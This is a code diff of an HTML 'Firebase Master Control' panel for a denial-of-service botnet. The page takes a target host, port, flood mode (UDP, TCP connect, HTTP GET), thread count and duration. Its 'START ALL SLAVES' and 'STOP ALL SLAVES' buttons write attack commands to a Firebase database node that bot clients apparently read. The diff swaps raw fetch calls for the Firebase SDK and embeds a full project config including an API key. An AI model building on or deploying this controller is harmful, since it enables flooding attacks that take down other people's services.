@@ -4,8 +4,8 @@
   <meta charset="UTF-8">
   <title>Firebase Master Control</title>
   <style>
-    body { font-family: Arial; background: #0f0f0f; color: #0f0; padding: 20px; text-align: center; }
-    input, select, button { padding: 12px; margin: 10px; font-size: 16px; width: 280px; }
+    body { font-family: Arial, sans-serif; background: #0f0f0f; color: #0f0; padding: 20px; text-align: center; }
+    input, select, button { padding: 12px; margin: 8px; font-size: 16px; width: 300px; }
     button { font-weight: bold; cursor: pointer; }
     .start { background: lime; color: black; }
     .stop  { background: red; color: white; }
@@ -18,8 +18,8 @@
   <input id="port" placeholder="Port" value="53" type="number"><br>
   <select id="mode">
     <option value="udp">UDP (L4)</option>
-    <option value="tcp">TCP Connect</option>
-    <option value="http">HTTP (L7)</option>
+    <option value="tcp">TCP Connect (L4)</option>
+    <option value="http">HTTP GET (L7)</option>
   </select><br>
   <input id="threads" placeholder="Threads" value="25" type="number"><br>
   <input id="duration" placeholder="Duration (sec)" value="25" type="number"><br>
@@ -29,8 +29,23 @@
   <button class="start" onclick="startAttack()">🚀 START ALL SLAVES</button>
   <button class="stop" onclick="stopAttack()">⛔ STOP ALL SLAVES</button>
 
-  <script>
-    const DB_URL = "https://onlinegame-f5c20-default-rtdb.firebaseio.com/command.json";
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.13.0/firebase-app.js";
+    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/12.13.0/firebase-database.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyAI2IHTVnBXNi_i9LJwrd-PvLf6CtuRzlw",
+      authDomain: "onlinegame-f5c20.firebaseapp.com",
+      databaseURL: "https://onlinegame-f5c20-default-rtdb.firebaseio.com",
+      projectId: "onlinegame-f5c20",
+      storageBucket: "onlinegame-f5c20.firebasestorage.app",
+      messagingSenderId: "1032630503376",
+      appId: "1:1032630503376:web:f122fa5ac5a142157ddbd5"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+    const commandRef = ref(db, 'command');
 
     async function startAttack() {
       const data = {
@@ -45,19 +60,14 @@
         timestamp: Date.now()
       };
 
-      await fetch(DB_URL, {
-        method: 'PUT',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(data)
-      });
+      await set(commandRef, data);
       alert("🚀 START command sent to all slaves!");
     }
 
     async function stopAttack() {
-      await fetch(DB_URL, {
-        method: 'PUT',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ action: "stop", timestamp: Date.now() })
+      await set(commandRef, { 
+        action: "stop", 
+        timestamp: Date.now() 
       });
       alert("⛔ STOP command sent!");
     }
